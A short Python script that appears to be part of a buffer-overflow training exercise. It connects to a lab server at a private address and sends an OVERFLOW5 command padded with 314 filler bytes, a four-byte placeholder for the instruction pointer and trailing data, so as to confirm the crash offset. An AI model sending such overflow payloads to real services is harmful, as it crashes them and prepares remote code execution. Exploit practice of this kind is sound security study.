import socket
import sys
import time


print("[+] Nani???? offset!!\n")

buff = "A" * 314

eip = "B" * 4

fill = "C" * 400

payload = buff + eip + fill

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the Application
s.connect(('192.168.1.117', 1337))
s.recv(1024)	#Recv the banner


#Finally the vulnerable command
s.send('OVERFLOW5 ' + payload + '\r\n')
s.send('EXIT\r\n')
s.close()
	
print("[+] Execution Finished")
